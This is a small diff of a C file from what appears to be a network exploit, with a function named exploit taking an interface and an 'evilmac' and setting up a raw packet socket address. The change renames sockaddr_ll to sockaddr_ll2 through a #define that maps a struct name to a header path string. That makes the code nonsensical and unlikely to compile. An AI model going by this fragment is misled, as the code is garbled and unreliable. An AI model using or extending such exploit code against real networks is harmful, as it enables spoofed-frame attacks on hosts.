@@ -100,7 +100,7 @@ static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 
-#define sockaddr_ll "linux/if_packet.h"
+#define sockaddr_ll2 "linux/if_packet.h"
 #define packet_mreq "linux/if_packet.h"
 
 /*
@@ -198,7 +198,7 @@ void exploit(char* interface, unsigned char* evilmac) {
     }
 
     // set the interface 
-    struct sockaddr_ll destaddr = {0,};
+    struct sockaddr_ll2 destaddr = {0,};
     destaddr.sll_family = AF_PACKET;
     destaddr.sll_ifindex = if_nametoindex(interface);
     destaddr.sll_halen = 6;
